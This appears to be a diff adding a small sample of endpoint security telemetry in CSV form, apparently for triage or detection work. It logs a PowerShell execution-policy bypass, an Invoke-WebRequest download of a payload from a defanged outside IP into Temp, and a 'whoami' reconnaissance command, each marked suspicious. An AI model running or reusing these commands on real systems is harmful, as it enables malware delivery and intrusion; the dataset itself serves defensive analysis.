@@ -1,0 +1,6 @@
+﻿TimeGenerated,DeviceName,AccountName,FileName,ProcessCommandLine,ParentProcess,EventType,NetworkIndicator,Assessment
+2026-06-09T20:11:04Z,WIN-WS-022,analyst3,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -File C:\Users\analyst3\Downloads\update-check.ps1",explorer.exe,ProcessCreated,,Suspicious
+2026-06-09T20:11:12Z,WIN-WS-022,analyst3,powershell.exe,"Invoke-WebRequest hxxp://203.0.113.77/update.dat -OutFile C:\Users\analyst3\AppData\Local\Temp\update.dat",powershell.exe,ScriptActivity,203.0.113.77,Suspicious
+2026-06-09T20:11:21Z,WIN-WS-022,analyst3,cmd.exe,"cmd.exe /c whoami",powershell.exe,ProcessCreated,,Suspicious
+2026-06-09T20:12:05Z,WIN-WS-022,analyst3,powershell.exe,"Get-Process",explorer.exe,ProcessCreated,,Likely benign
+2026-06-09T20:13:44Z,WIN-WS-022,analyst3,chrome.exe,"chrome.exe https://portal.office.com",explorer.exe,ProcessCreated,,Benign
